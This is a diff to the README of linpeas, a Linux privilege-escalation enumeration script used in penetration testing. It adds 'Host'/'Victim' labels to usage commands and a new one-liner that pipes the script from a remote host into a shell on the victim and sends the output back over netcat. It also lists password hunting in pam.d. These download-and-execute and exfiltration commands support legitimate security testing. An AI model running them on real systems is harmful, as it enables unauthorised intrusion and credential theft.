@@ -17,17 +17,21 @@ curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-
 
 ```bash
 #Local network
-sudo python -m SimpleHTTPServer 80
-curl 10.10.10.10/linpeas.sh | sh
+sudo python -m SimpleHTTPServer 80 #Host
+curl 10.10.10.10/linpeas.sh | sh #Victim
 
 #Without curl
-sudo nc -q 5 -lvnp 80 < linpeas.sh
-cat < /dev/tcp/10.10.10.10/80 | sh
+sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+
+#Excute from memory and send output back to the host
+nc -lvnp 9002 | tee linpeas.out #Host
+curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
 ```
 
 ```bash
 #Output to file
-linpeas -a > /dev/shm/linpeas.txt
+./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
 less -r /dev/shm/linpeas.txt #Read with colors
 ```
 
@@ -254,6 +258,7 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] Autologin files
   - [x] S/Key
   - [x] YubiKey
+  - [x] Passwords inside pam.d
 
 - **Generic Interesting Files**
   - [x] SUID & SGID files
